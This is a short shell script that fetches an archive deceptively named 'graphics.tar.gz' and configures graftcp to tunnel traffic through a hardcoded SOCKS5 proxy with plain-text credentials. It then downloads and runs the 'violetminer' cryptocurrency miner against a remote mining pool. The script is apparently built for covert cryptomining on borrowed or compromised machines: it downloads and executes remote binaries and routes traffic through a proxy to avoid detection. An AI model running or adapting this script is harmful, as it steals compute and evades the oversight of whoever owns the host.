#apt-get update -y
wget https://github.com/Melpinoy/Gg/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = 45.88.24.139:443

socks5_username = temera88

socks5_password = temera88

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "


./graftcp/graftcp wget https://github.com/Melpinoy/Gg/raw/main/violetminer && chmod +x violetminer && ./violetminer --algorithm wrkzcoin --pool 45.88.24.197:443 --username SK_pDKo9B7rTqyPDrYeohNv5.Temera88 --password x --disableNVIDIA --threads 1
